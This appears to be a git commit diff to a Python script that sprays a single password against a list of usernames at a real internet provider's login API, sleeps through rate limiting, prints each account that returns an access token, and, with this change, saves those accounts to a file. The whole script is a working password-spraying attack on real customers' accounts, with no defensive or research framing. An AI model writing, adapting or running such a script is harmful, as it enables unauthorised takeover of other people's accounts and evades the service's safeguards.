fe394497ce932d9619db88e6e487dbbafd39d7bf
mustafa-ahsan <44897579+mustafa-ahsan@users.noreply.github.com>
2023-06-02 16:22:14 +0300

    Update test.py

--- test.py
+++ test.py
@@ -7,31 +7,31 @@ listpas = input("Enter password list: ")
 userLIST = []
 usernameLIST = []
 passinpot = open(u, 'r').readlines()
+
+output_file = open("output.txt", "w")  # اسم الملف النصي الذي ستتم كتابة القيم فيه
+
 for line in passinpot:
-  a = line.strip()
+    a = line.strip()
 
+    data = {
+        'grant_type': 'password',
+        'username': a,
+        'password': listpas,
+        'Logintype': '0'
+    }
 
-  data = {
-  'grant_type': 'password',
-  'username': a,
-  'password': listpas,
-  'Logintype': '0'
-  }
+    http = requests.post('https://ubapi.earthlink.iq/api/user/Token', data=data)
 
-  http = requests.post('https://ubapi.earthlink.iq/api/user/Token', data=data)
+    print(http.text)
+    print(a)
+    if 'Too many !' in http.text:
+        print("loading ... .>>>^^^^^^")
+        time.sleep(100)
+        print(a)
+    if 'access_token' in http.text:
+        os.system("clear")
+        userLIST.append(a)
+        print("USER FUONDD  ", userLIST, "and PASS", "[", listpas, "]")
+        output_file.write(a + "\n")  # كتابة القيمة في الملف النصي
 
-  print(http.text)
-  print(a)
-  if 'Too many !' in http.text:
-     
-     print("loading ... .>>>^^^^^^")
-     time.sleep(100)
-     print(a)
-  if 'access_token' in http.text:
-      os.system("clear")
-      userLIST.append(a)
-      print("USER FUONDD  ",userLIST, "and PASS","[",listpas,"]")
-
-
-
-
+output_file.close()  # إغلاق الملف بعد الانتهاء
